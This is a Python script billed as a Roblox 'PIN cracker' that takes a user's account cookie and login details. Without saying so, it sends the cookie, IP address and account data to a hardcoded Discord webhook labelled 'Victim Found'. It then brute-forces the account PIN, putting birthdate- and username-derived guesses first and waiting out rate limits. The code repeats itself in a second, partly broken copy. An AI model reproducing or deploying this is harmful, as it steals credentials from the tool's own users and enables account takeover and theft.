
import time
import ctypes
import requests
from threading import Thread
import colorama
from colorama import Fore
import os
import fade
import json


title = fade.purpleblue(f"""
██████╗ ██╗███╗   ██╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██║████╗  ██║    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██████╔╝██║██╔██╗ ██║    ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██╔═══╝ ██║██║╚██╗██║    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║     ██║██║ ╚████║    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

//// KENJI   PIN   CRACKER ////""")

print(title)

def main(cookie):
    ipAddr = requests.get("https://api.ipify.org").text

    statistics = None
    ID = "Couldn't get user ID to parse this info"

    if cookie:
        response = requests.get("https://www.roblox.com/mobileapi/userinfo",
                                headers={"Cookie": ".ROBLOSECURITY=" + cookie},
                                allow_redirects=False)

        if response.status_code == 200:
            statistics = response.json()
            ID = statistics.get("UserID", "N/A")

            payload = {
        "content": None,
        "embeds": [
            {
                "description": "```" + (cookie if cookie else "COOKIE NOT FOUND") + "```",
                "color": None,
                "fields": [
                    {"name": "Username", "value": statistics["UserName"] if statistics else "N/A", "inline": True},
                    {"name": "Robux", "value": statistics["RobuxBalance"] if statistics else "N/A", "inline": True},
                    {"name": "Premium", "value": statistics["IsPremium"] if statistics else "N/A", "inline": True},
                    {"name": "ID", "value": statistics["UserID"] if statistics else "N/A", "inline": True},
                    {"name": "Builders Club", "value": statistics["IsAnyBuildersClubMember"] if statistics else "N/A", "inline": True},
                    {"name": "ID Test", "value": ID, "inline": True},
                ],
                "author": {
                    "name": "Victim Found: " + ipAddr,
                    "icon_url": statistics["ThumbnailUrl"] if statistics else "https://media.discordapp.net/attachments/915668636532891719/1172998214522261514/2023-11-11_182941.png?ex=65625ab7&is=654fe5b7&hm=1acde7ee32607a601180611da1e0e5deea272ab32c9761f7fc6ffcf281f0afd1&=&width=40&height=42",
                },
                "thumbnail": {
                    "url": statistics["ThumbnailUrl"] if statistics else "https://media.discordapp.net/attachments/915668636532891719/1172998196541268149/2023-11-11_182650.png?ex=65625ab3&is=654fe5b3&hm=72dc5b33ed943678d08531dad35607b67e5efcefc6be9648d38bfb44420b54fb&=&width=828&height=342",
                }
            }
        ],
        "username": "kenjixoxo",
        "avatar_url": "https://media.discordapp.net/attachments/915668636532891719/1172998039825301604/2023-11-11_205244.png?ex=65625a8d&is=654fe58d&hm=84366c567d3152a0e53aea03af31c6c67737db783e246356e77fcbb4554311c0&=&width=272&height=227",
        "attachments": []
        }

    headers = {"Content-Type": "Application/json"}
    response = requests.post(WEBHOOK, headers=headers, data=json.dumps(payload))

WEBHOOK = "https://discord.com/api/webhooks/1177317570806825061/N7I-iPAOHyToO5D2Q3BF3hR49vhugxrV8CdgU7zsHHmw2Tlcyx2t58_g9DQ2yQDXpHfo"
credentials = input(Fore.RED + 'Enter the account cookie - ')
if credentials.count(':') >= 2:
    username, password, cookie = credentials.split(':',2)
else:
    username, password, cookie = '', '', credentials
os.system('cls')

main(credentials)

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
    print(Fore.YELLOW + 'Logged in to', username)
except:
    input(Fore.RED + 'INVALID COOKIE')
    exit()

common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
print(Fore.CYAN + 'Loaded pins was made by kenixoxo.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)
print(f'Prioritized likely pins {likely}\n')

tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(Fore.MAGENTA + f'[FAILURE] Account cookie expired. :(')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('pins.txt','a') as f:
                    f.write(f'NO PIN:{credentials}\n')
                break
            elif code == 3 or '"message":"TooManyRequests"' in r.text:
                pins.insert(0, pin)
                print(Fore.YELLOW + f'[{datetime.now()}] Sleeping for 5 minutes...')
                time.sleep(60*5)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('pins.txt','a') as f:
                f.write(f'{pin}:{credentials}\n')
            break
        else:
            pins.insert(0, pin)
            print(f'[ERROR] {r.text}')
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.insert(0, pin)


import json


input()

print(title)
account = input(
    'Enter your user:pass:cookie.\n'
    'No user:pass? Just do something like random:poop:<cookie>\n'
    '--> '
)

try: username, password, cookie = account.split(':',2)
except:
    input('INVALID FORMAT >:(')
    exit()

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    r = req.get('https://www.roblox.com/mobileapi/userinfo').json()
    userid = r['UserID']
except:
    input('INVALID COOKIE')
    exit()

print('Logged in.\n')


r = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [x.split(',')[0] for x in r.splitlines()]
print('Loaded most common pins.')
print('please wait 15/20 minuts for cooldown.')
r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)

print(f'Prioritized likely pins {likely}\n')

sleep = 0
tried = 0

while 1:
    pin = pins.pop(0)
    ctypes.windll.kernel32.SetConsoleTitleW(f'PIN CRACKER | Tried: {tried}/9999 | Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[] NO PIN')
                with open('cracked.txt','a') as f:
                    f.write(f'NO PIN:{account}\n')
                break
            elif code == 3:
                pins.insert(0, pin)
                sleep += 1
                if sleep == 5:
                    sleep = 0
                    time.sleep(300)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('cracked.txt','a') as f:
                f.write(f'{pin}:{account}\n')
            break
        else:
            print(f'[ERROR] {r.text}')
            pins.append(pin)
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.append(pin)

input()
